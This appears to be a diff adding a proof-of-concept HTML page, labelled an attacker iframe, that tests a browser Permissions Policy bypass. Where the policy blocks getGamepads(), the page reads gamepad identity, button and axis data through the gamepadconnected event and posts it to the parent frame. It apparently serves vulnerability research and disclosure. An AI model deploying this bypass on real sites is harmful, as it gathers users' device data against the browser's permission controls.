@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body { font-family: monospace; padding: 10px; background: #222; color: #ccc; }
+.success { color: #0f0; font-weight: bold; }
+.blocked { color: #f00; }
+.bypass { color: #ff0; font-weight: bold; font-size: 1.2em; }
+</style>
+</head>
+<body>
+<h3>Attacker Iframe (PP should block gamepad)</h3>
+
+<div id="test1">Test 1: getGamepads() - checking...</div>
+<div id="test2">Test 2: addEventListener('gamepadconnected') - waiting for gamepad...</div>
+<div id="test3">Test 3: Gamepad data via event - waiting...</div>
+
+<pre id="log"></pre>
+
+<script>
+function log(msg) {
+  document.getElementById('log').textContent += msg + '\n';
+  window.parent.postMessage(msg, '*');
+}
+
+// TEST 1: navigator.getGamepads() — should be blocked by PP (renderer check)
+try {
+  let pads = navigator.getGamepads();
+  document.getElementById('test1').innerHTML =
+    '<span class="success">Test 1: getGamepads() SUCCEEDED (PP not enforced!)</span>';
+  log('TEST1: getGamepads() succeeded - ' + pads.length + ' slots');
+} catch(e) {
+  document.getElementById('test1').innerHTML =
+    '<span class="blocked">Test 1: getGamepads() correctly BLOCKED: ' + e.message + '</span>';
+  log('TEST1: getGamepads() blocked as expected: ' + e.message);
+}
+
+// TEST 2: addEventListener('gamepadconnected') — this is the BYPASS path
+// The DidAddEventListener → StartUpdating → GamepadMonitor Mojo path has NO PP check
+let gamepadDataReceived = false;
+
+window.addEventListener('gamepadconnected', function(event) {
+  gamepadDataReceived = true;
+  let gp = event.gamepad;
+
+  document.getElementById('test2').innerHTML =
+    '<span class="bypass">TEST 2: gamepadconnected EVENT FIRED DESPITE PP DENIAL!</span>';
+
+  let data = {
+    id: gp.id,
+    index: gp.index,
+    buttons: gp.buttons.length,
+    axes: gp.axes.length,
+    connected: gp.connected,
+    mapping: gp.mapping,
+    timestamp: gp.timestamp
+  };
+
+  document.getElementById('test3').innerHTML =
+    '<span class="bypass">TEST 3: GAMEPAD DATA RECEIVED:</span><br>' +
+    '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
+
+  log('TEST2: BYPASS CONFIRMED! gamepadconnected event received');
+  log('TEST3: Gamepad ID: ' + gp.id);
+  log('TEST3: Buttons: ' + gp.buttons.length + ', Axes: ' + gp.axes.length);
+
+  // Read button states
+  let buttonStates = [];
+  for (let i = 0; i < gp.buttons.length; i++) {
+    buttonStates.push({
+      pressed: gp.buttons[i].pressed,
+      value: gp.buttons[i].value.toFixed(2)
+    });
+  }
+  log('TEST3: Button states: ' + JSON.stringify(buttonStates));
+  log('TEST3: Axes: ' + JSON.stringify(Array.from(gp.axes).map(v => v.toFixed(3))));
+});
+
+window.addEventListener('gamepaddisconnected', function(event) {
+  log('DISCONNECT: Gamepad disconnected (index ' + event.gamepad.index + ')');
+});
+
+// Also test: gamepadinputchanged (non-standard, may not fire)
+window.addEventListener('gamepadinputchanged', function(event) {
+  log('INPUT_CHANGED: Gamepad input changed (index ' + event.gamepad.index + ')');
+});
+
+log('Iframe loaded. addEventListener("gamepadconnected") registered.');
+log('If getGamepads() is blocked but gamepadconnected fires, PP bypass is confirmed.');
+log('Connect/disconnect a gamepad to trigger the event...');
+
+// Periodic check — poll gamepad state via the connected event's reference
+setInterval(function() {
+  if (gamepadDataReceived) {
+    // Try to get updated gamepad state from the connected gamepads
+    // Note: getGamepads() would fail here due to PP, but we already have
+    // the gamepad reference from the event
+  }
+}, 1000);
+</script>
+</body>
+</html>
